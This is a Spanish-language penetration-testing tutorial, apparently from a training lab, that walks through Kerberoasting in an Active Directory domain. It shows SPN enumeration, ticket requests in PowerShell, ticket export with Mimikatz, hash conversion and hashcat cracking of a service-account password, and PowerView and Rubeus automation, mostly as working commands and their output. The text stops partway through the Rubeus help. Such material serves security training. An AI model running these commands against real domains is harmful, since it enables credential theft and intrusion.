
# Kerberoasting desde Windows

## <mark style="color:purple;">Kerberoasting: método semi manual</mark>

Antes de que existieran herramientas como `Rubeus`, robar o falsificar tickets Kerberos era un proceso manual y complejo. A medida que la táctica y las defensas han evolucionado, ahora podemos realizar Kerberoasting desde Windows de múltiples maneras. Para comenzar a recorrer este camino, exploraremos la ruta manual y luego pasaremos a herramientas más automatizadas. Comencemos con el binario [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241\(v=ws.11\)) integrado para enumerar los SPN en el dominio.

### **Enumeración de SPN con setspn.exe**

```powershell
C:\htb> setspn.exe -Q */*

Checking domain DC=INLANEFREIGHT,DC=LOCAL
CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL
        exchangeAB/ACADEMY-EA-DC01
        exchangeAB/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        TERMSRV/ACADEMY-EA-DC01
        TERMSRV/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/ForestDnsZones.INLANEFREIGHT.LOCAL
        ldap/ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DomainDnsZones.INLANEFREIGHT.LOCAL

<SNIP>

CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        backupjob/veam001.inlanefreight.local
CN=SOLARWINDSMONITOR,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        sts/inlanefreight.local

<SNIP>

CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

Existing SPN found!
```

Notaremos que se devuelven muchos SPN diferentes para los distintos hosts del dominio. Nos centraremos en las `user accounts`  y ignoraremos las cuentas de computadora devueltas por la herramienta. A continuación, mediante PowerShell, podemos solicitar tickets TGS para una cuenta en el shell anterior y cargarlos en la memoria. Una vez que se cargan en la memoria, podemos extraerlos mediante `Mimikatz`. Probemos esto apuntando a un solo usuario:

### **Dirigido a un único usuario**

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

Antes de continuar, analicemos los comandos anteriores para ver qué estamos haciendo (que es esencialmente lo que utiliza [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) cuando utiliza el método Kerberoasting predeterminado):

* El cmdlet [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) se utiliza para agregar una clase de .NET Framework a nuestra sesión de PowerShell, que luego se puede instanciar como cualquier objeto de .NET Framework.
* El parámetro `-AssemblyName` nos permite especificar un ensamblaje que contiene los tipos que nos interesa utilizar.
* [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) es un namespace que contiene diferentes clases para crear servicios de token de seguridad.
* Luego usaremos el cmdlet [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) para crear una instancia de un objeto .NET Framework
* Usaremos el namespace [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) con la clase [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) para crear un token de seguridad y pasar el nombre SPN a la clase para solicitar un ticket TGS de Kerberos para la cuenta de destino en nuestra sesión de inicio de sesión actual.

También podemos optar por recuperar todos los tickets usando el mismo método, pero esto también extraerá todas las cuentas de computadora, por lo que no es óptimo.

### **Recuperación de todos los tickets mediante setspn.exe**

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-3
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : exchangeAB/ACADEMY-EA-DC01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-4
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/24/2022 11:58:18 PM
ServicePrincipalName : kadmin/changepw
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:56:18 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

<SNIP>
```

El comando anterior combina el comando anterior con `setspn.exe` para solicitar tickets para todas las cuentas con SPN configurados.

Ahora que los tickets están cargados, podemos usar `Mimikatz` para extraer el/los ticket(s) de la `memoria`.

### Extraer tickets de la memoria con Mimikatz

```powershell
Using 'mimikatz.log' for logfile : OK

mimikatz # base64 /out:true
isBase64InterceptInput  is false
isBase64InterceptOutput is true

mimikatz # kerberos::list /export  

<SNIP>

[00000002] - 0x00000017 - rc4_hmac_nt      
   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
====================
Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
====================
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
ZWZyZWlnaHQubG9jYWw6MTQzMw==
====================

   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi

<SNIP>
```

Si no especificamos el comando `base64 /out:true`, Mimikatz extraerá los tickets y los escribirá en archivos `.kirbi`. Dependiendo de nuestra posición en la red y si podemos mover fácilmente los archivos a nuestro host de ataque, esto puede ser más fácil cuando vayamos a descifrar los tickets. Tomemos el blob base64 recuperado anteriormente y preparémoslo para descifrarlo. Se llama blob porque es un bloque de contenido que contiene espacios en blanco y saltos de línea.

A continuación, podemos tomar el blob base64 y eliminar las nuevas líneas y los espacios en blanco, ya que la salida está envuelta en columnas y lo necesitamos todo en una línea para el siguiente paso.

### **Preparación del blob Base64 para el crackeo**

```shell-session
afsh4ck@kali$ echo "<base64 blob>" |  tr -d \\n 

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
```

### **Colocar la salida en un archivo como .kirbi**

Podemos colocar la única línea de salida anterior en un archivo y convertirla nuevamente en un archivo `.kirbi` usando la utilidad `base64`.

```shell-session
afsh4ck@kali$ cat encoded_file | base64 -d > sqldev.kirbi
```

A continuación, podemos utilizar [esta](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) versión de `kirbi2john.py` para extraer el ticket Kerberos del archivo TGS.

### **Extracción del ticket Kerberos mediante kirbi2john.py**

```shell-session
afsh4ck@kali$ python2.7 kirbi2john.py sqldev.kirbi
```

Esto creará un archivo llamado `crack_file`. Luego debemos modificar un poco el archivo para poder usar Hashcat contra el hash.

### **Modificar el crack\_file para Hashcat**

```shell-session
afsh4ck@kali$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

Ahora podemos comprobar y confirmar que tenemos un hash que se puede enviar a Hashcat.

### **Visualizar el hash preparado**

```shell-session
afsh4ck@kali$ cat sqldev_tgs_hashcat 

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
```

Luego podemos ejecutar el ticket a través de Hashcat nuevamente y obtener la contraseña en texto sin formato `database!`.

### **Crackear el hash con Hashcat**

{% code overflow="wrap" %}

```shell-session
afsh4ck@kali$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 

<SNIP>

$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf2<------SNIP------>
c273d2df73350f2d6c5438e71a057feeab:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965e...7feeab
Time.Started.....: Thu Feb 24 22:03:03 2022 (8 secs)
Time.Estimated...: Thu Feb 24 22:03:11 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1150.5 kH/s (9.76ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8773632/14344385 (61.16%)
Rejected.........: 0/8773632 (0.00%)
Restore.Point....: 8749056/14344385 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius -> darjes

Started: Thu Feb 24 22:03:00 2022
Stopped: Thu Feb 24 22:03:11 2022
```

{% endcode %}

Si decidimos omitir la salida base64 con Mimikatz y escribimos `mimikatz # kerberos::list /export`, el archivo (o los archivos) .kirbi se escribirán en el disco. En este caso, podemos descargar el archivo o los archivos y ejecutar `kirbi2john.py` directamente, omitiendo el paso de decodificación base64.

Ahora que hemos visto la forma más antigua y manual de realizar Kerberoasting desde una máquina Windows y el procesamiento sin conexión, veamos algunas formas más rápidas. La mayoría de las evaluaciones tienen un límite de tiempo y, a menudo, necesitamos trabajar lo más rápido y eficientemente posible, por lo que el método anterior probablemente no sea el que elijamos siempre. Dicho esto, puede ser útil tener otros trucos bajo la manga y metodologías en caso de que nuestras herramientas automatizadas fallen o se bloqueen.

***

## <mark style="color:purple;">Kerberoasting automatizado</mark>

A continuación, veremos dos formas mucho más rápidas de realizar Kerberoasting desde un host de Windows. Primero, usemos [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) para extraer los tickets TGS y convertirlos al formato Hashcat. Podemos comenzar enumerando las cuentas SPN.

### **PowerView para extraer tickets de TGS**

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor
```

Desde aquí, podríamos apuntar a un usuario específico y recuperar el ticket TGS en formato Hashcat.

### **PowerView para identificar a un usuario específico**

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433*$BF9729001
                       376B63C5CAC933493C58CE7$4029DBBA2566AB4748EDB609CA47A6E7F6E0C10AF50B02D10A6F92349DDE3336018DE177
                       AB4FF3CE724FB0809CDA9E30703EDDE93706891BCF094FE64387B8A32771C7653D5CFB7A70DE0E45FF7ED6014B5F769F
                       DC690870416F3866A9912F7374AE1913D83C14AB51E74F200754C011BD11932464BEDA7F1841CCCE6873EBF0EC5215C0
                       12E1938AEC0E02229F4C707D333BD3F33642172A204054F1D7045AF3303809A3178DD7F3D8C4FB0FBB0BB412F3BD5526
                       7B1F55879DFB74E2E5D976C4578501E1B8F8484A0E972E8C45F7294DA90581D981B0F177D79759A5E6282D86217A03A9
                       ADBE5EEB35F3924C84AE22BBF4548D2164477409C5449C61D68E95145DA5456C548796CC30F7D3DDD80C48C84E3A538B
                       019FB5F6F34B13859613A6132C90B2387F0156F3C3C45590BBC2863A3A042A04507B88FD752505379C42F32A14CB9E44
                       741E73285052B70C1CE5FF39F894412010BAB8695C8A9BEABC585FC207478CD91AE0AD03037E381C48118F0B65D25847
                       B3168A1639AF2A534A63CF1BC9B1AF3BEBB4C5B7C87602EEA73426406C3A0783E189795DC9E1313798C370FD39DA53DD
                       CFF32A45E08D0E88BC69601E71B6BD0B753A10C36DB32A6C9D22F90356E7CD7D768ED484B9558757DE751768C99A64D6
                       50CA4811D719FC1790BAE8FE5DB0EB24E41FF945A0F2C80B4C87792CA880DF9769ABA2E87A1ECBF416641791E6A762BF
                       1DCA96DDE99D947B49B8E3DA02C8B35AE3B864531EC5EE08AC71870897888F7C2308CD8D6B820FCEA6F584D1781512AC
                       089BFEFB3AD93705FDBA1EB070378ABC557FEA0A61CD3CB80888E33C16340344480B4694C6962F66CB7636739EBABED7
                       CB052E0EAE3D7BEBB1E7F6CF197798FD3F3EF7D5DCD10CCF9B4AB082CB1E199436F3F271E6FA3041EF00D421F4792A0A
                       DCF770B13EDE5BB6D4B3492E42CCCF208873C5D4FD571F32C4B761116664D9BADF425676125F6BF6C049DD067437858D
                       0866BE520A2EBFEA077037A59384A825E6AAA99F895A58A53313A86C58D1AA803731A849AE7BAAB37F4380152F790456
                       37237582F4CA1C5287F39986BB233A34773102CB4EAE80AFFFFEA7B4DCD54C28A824FF225EA336DE28F4141962E21410
                       D66C5F63920FB1434F87A988C52604286DDAD536DA58F80C4B92858FE8B5FFC19DE1B017295134DFBE8A2A6C74CB46FF
                       A7762D64399C7E009AA60B8313C12D192AA25D3025CD0B0F81F7D94249B60E29F683B797493C8C2B9CE61B6E3636034E
                       6DF231C428B4290D1BD32BFE7DC6E7C1E0E30974E0620AE337875A54E4AFF4FD50C4785ADDD59095411B4D94A094E87E
                       6879C36945B424A86159F1575042CB4998F490E6C1BC8A622FC88574EB2CF80DD01A0B8F19D8F4A67C942D08DCCF23DD
                       92949F63D3B32817941A4B9F655A1D4C5F74896E2937F13C9BAF6A81B7EEA3F7BC7C192BAE65484E5FCCBEE6DC51ED9F
                       05864719357F2A223A4C48A9A962C1A90720BBF92A5C9EEB9AC1852BC3A7B8B1186C7BAA063EB0AA90276B5D91AA2495
                       D29D545809B04EE67D06B017C6D63A261419E2E191FB7A737F3A08A2E3291AB09F95C649B5A71C5C45243D4CEFEF5EED
                       95DDD138C67495BDC772CFAC1B8EF37A1AFBAA0B73268D2CDB1A71778B57B02DC02628AF11
```

Finalmente, podemos exportar todos los tickets a un archivo CSV para su procesamiento sin conexión.

### **Exportar todos los tickets a un archivo CSV**

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

**Visualizar el contenido del archivo .CSV**

```powershell
PS C:\htb> cat .\ilfreight_tgs.csv

"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1

<SNIP>
```

También podemos utilizar [Rubeus](https://github.com/GhostPack/Rubeus) de GhostPack para realizar Kerberoasting de forma aún más rápida y sencilla. Rubeus nos proporciona una variedad de opciones para realizar Kerberoasting.

### **Rubeus**

```powershell
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
